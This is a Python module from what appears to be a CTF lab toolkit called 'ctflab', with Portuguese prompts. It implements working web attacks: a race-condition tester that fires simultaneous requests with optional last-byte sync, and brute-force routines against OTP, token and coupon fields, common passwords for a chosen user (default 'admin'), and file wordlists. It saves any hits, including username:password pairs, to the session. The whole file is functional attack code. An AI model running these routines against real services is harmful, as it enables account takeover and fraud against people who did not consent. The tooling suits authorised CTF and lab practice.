"""modules/race.py"""

from __future__ import annotations

from pathlib import Path

from rich.console import Console

from ctflab.core import http as H, payloads as P
from ctflab.core.session import Session
from ctflab.cli.menu import run_menu
from ctflab.cli.ui import ask, askctx, ask_int, ask_json_interactive, show_response, scan_table


def _race(s: Session, c: Console) -> None:
    path    = askctx(s, "path", "path", "/")
    payload = ask_json_interactive(c)
    if payload is None:
        return

    n = ask_int("requisições simultâneas", 10)

    sync_raw = ask("usar last-byte sync? mais preciso para janelas pequenas (s/n)", "n")
    sync     = sync_raw.lower().startswith("s")

    if sync:
        c.print(f"\n[warn]disparando {n} requisições (last-byte sync)...[/warn]\n")
    else:
        c.print(f"\n[warn]disparando {n} requisições simultâneas...[/warn]\n")

    results = H.race(s, path, payload, n, synchronized=sync)

    table = scan_table(f"Race Condition — {n} requisições", ["#", "status", "resposta"])
    hits  = 0
    for i, (status, body) in enumerate(results, 1):
        style = "ok" if status == 200 else ("warn" if status > 0 else "fail")
        table.add_row(str(i), f"[{style}]{status}[/{style}]", body[:80])
        if status == 200:
            hits += 1
            s.note(f"race hit #{i}: {body[:80]}")

    c.print(table)
    c.print(f"\n[ok]{hits}/{n} com status 200[/ok]\n")


from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

def _brute_single_field(s: Session, c: Console) -> None:
    """
    Brute em campo único — tokens, OTPs, cupons, códigos, IDs curtos.
    """
    path  = askctx(s, "path",       "path",        "/")
    field = askctx(s, "brute_field","campo alvo",  "token")

    # wordlist
    mode = ask("fonte (c=comuns / a=arquivo / n=numérico / d=descobertos)", "c")

    if mode.startswith("a"):
        fp = ask("caminho da wordlist")
        try:
            words = Path(fp).read_text().splitlines()
        except Exception as exc:
            c.print(f"[fail]{exc}[/fail]")
            return
    elif mode.startswith("n"):
        start = ask_int("início", 0)
        end   = ask_int("fim", 9999)
        pad   = ask_int("zeros à esquerda (0 = sem pad)", 0)
        words = [str(i).zfill(pad) if pad else str(i) for i in range(start, end + 1)]
    elif mode.startswith("d"):
        words = list(filter(None, s.recall("discovered_words", "").split(",")))
        if not words:
            c.print("[warn]nenhuma palavra descoberta ainda. use o Recon primeiro.[/warn]")
            return
        c.print(f"[info]usando {len(words)} palavras colhidas do Recon...[/info]")
    else:
        words = P.load("passwords")

    stop_on_hit = ask("parar no primeiro 200? (s/n)", "s").lower().startswith("s")

    c.print(f"\n[warn]testando {len(words)} entradas no campo '{field}'...[/warn]\n")

    hits = []
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task(f"bruteforcing {field}", total=len(words))
        
        with H._make_client(s) as cl:
            for word in words:
                word = word.strip()
                if not word: continue
                try:
                    prog.update(task, description=f"testando [dim]{word[:20]}[/dim]", advance=1)
                    r = cl.post(path, json={field: word})
                    if r.status_code == 200:
                        c.print(f"\n[ok]hit: {word!r} → {r.text[:80]}[/ok]")
                        s.note(f"brute hit '{field}': {word}")
                        hits.append(word)
                        if stop_on_hit:
                            return
                except Exception as exc:
                    c.print(f"[fail]erro em '{word}': {exc}[/fail]")
                    return

    if not hits:
        c.print("\n[fail]nenhum hit encontrado[/fail]")


def _brute_passwords(s: Session, c: Console) -> None:
    path = askctx(s, "path",       "path",          "/")
    uf   = askctx(s, "field_user", "campo usuário", "")
    pf   = askctx(s, "field_pass", "campo senha",   "")
    user = askctx(s, "brute_user", "usuário alvo",  "admin")

    wordlist = P.load("passwords")
    c.print(f"\n[warn]testando {len(wordlist)} senhas para '{user}'...[/warn]\n")

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task("bruteforcing senhas", total=len(wordlist))
        
        with H._make_client(s) as cl:
            for pwd in wordlist:
                try:
                    prog.update(task, description=f"testando [dim]{pwd[:20]}[/dim]", advance=1)
                    r = cl.post(path, json={uf: user, pf: pwd})
                    if r.status_code == 200:
                        c.print(f"\n[ok]senha encontrada: {pwd}[/ok]")
                        s.note(f"bruteforce success: {user}:{pwd}")
                        return
                except Exception as exc:
                    c.print(f"[fail]erro em '{pwd}': {exc}[/fail]")
                    return

    c.print("\n[fail]nenhuma senha encontrada[/fail]")


def _brute_wordlist(s: Session, c: Console) -> None:
    filepath = ask("caminho da wordlist")
    try:
        wordlist = Path(filepath).read_text().splitlines()
    except Exception as exc:
        c.print(f"[fail]{exc}[/fail]")
        return

    path = askctx(s, "path",       "path",          "/")
    uf   = askctx(s, "field_user", "campo usuário", "")
    pf   = askctx(s, "field_pass", "campo senha",   "")
    user = askctx(s, "brute_user", "usuário alvo",  "")

    c.print(f"\n[warn]testando {len(wordlist)} entradas...[/warn]\n")
    
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task("bruteforcing wordlist", total=len(wordlist))
        
        with H._make_client(s) as cl:
            for pwd in wordlist:
                pwd = pwd.strip()
                if not pwd: continue
                try:
                    prog.update(task, description=f"testando [dim]{pwd[:20]}[/dim]", advance=1)
                    r = cl.post(path, json={uf: user, pf: pwd})
                    if r.status_code == 200:
                        c.print(f"\n[ok]senha encontrada: {pwd}[/ok]")
                        s.note(f"bruteforce wordlist success: {user}:{pwd}")
                        return
                except Exception:
                    pass

    c.print("\n[fail]não encontrado[/fail]")


_OPTIONS = {
    "1": ("race condition",              _race),
    "2": ("brute — campo único (OTP/token/cupom)", _brute_single_field),
    "3": ("brute — senhas comuns",       _brute_passwords),
    "4": ("brute — wordlist de arquivo", _brute_wordlist),
    "0": ("voltar",                      None),
}


def run(session: Session, console: Console) -> None:
    run_menu("RACE / BRUTEFORCE", _OPTIONS, session, console)
